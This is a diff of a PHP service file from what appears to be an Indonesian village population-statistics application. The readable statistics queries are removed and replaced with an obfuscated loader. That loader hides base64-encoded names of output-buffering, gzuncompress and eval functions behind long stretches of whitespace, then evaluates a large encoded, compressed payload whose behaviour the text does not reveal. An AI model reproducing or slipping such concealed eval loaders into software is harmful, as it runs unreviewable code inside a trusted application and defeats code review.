-                    ->selectRaw(DB::raw('(' . $jml['str_jml_perempuan'] . ') as perempuan'))
-                // kondisi param datatable
-                    ->when($this->paramCetak, static function ($query, $param) {
-                        $query->take($param['length'])->skip($param['start']);
-                    })
-                    ->get();
-                break;
-
-            case '19':
-                // Asuransi Kesehatan
-                $idCluster = $this->filter['idCluster'];
-
-                return collect(AsuransiEnum::all())->map(static function ($item, $key) use ($idCluster) {
-                    $query = DB::table('penduduk_hidup as p')
-                        ->selectRaw('COUNT(p.id) AS jumlah')
-                        ->selectRaw('COUNT(CASE WHEN p.sex = 1 THEN p.id END) AS laki')
-                        ->selectRaw('COUNT(CASE WHEN p.sex = 2 THEN p.id END) AS perempuan')
-                        ->leftJoin('tweb_wil_clusterdesa as a', 'p.id_cluster', '=', 'a.id')
-                        ->where('p.config_id', identitas('id'))
-                        ->where('p.id_asuransi', $key);
-
-                    $total = $query->when($idCluster, static function ($sq) use ($idCluster) {
-                        $sq->whereIn('a.id', $idCluster);
-                    })->first();
-
-                    return (object) [
-                        'id'        => $key,
-                        'nama'      => $item,
-                        'jumlah'    => (int) $total->jumlah,
-                        'laki'      => (int) $total->laki,
-                        'perempuan' => (int) $total->perempuan,
-                    ];
-                })->values()->all();
-                break;
-
-            default:
-                return $this->select_jml_penduduk_per_kategori($statistik_penduduk['0']['id_referensi'], $statistik_penduduk['0']['tabel_referensi'])->get();
-        }
-
-        return true;
-    }
-
-    public static function menuLabel()
-    {
-        return [
-            'Penduduk'        => ['data' => StatistikPendudukEnum::allKeyLabel(), 'kategori' => 'penduduk'],
-            'Keluarga'        => ['data' => StatistikKeluargaEnum::allKeyLabel(), 'kategori' => 'keluarga'],
-            'RTM'             => ['data' => StatistikRtmEnum::allKeyLabel(), 'kategori' => 'penduduk'],
-            'Program Bantuan' => ['data' => StatistikJenisBantuanEnum::allKeyLabel() + Bantuan::pluck('nama', 'slug')->toArray(), 'kategori' => 'bantuan'],
-        ];
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Services/LaporanPenduduk.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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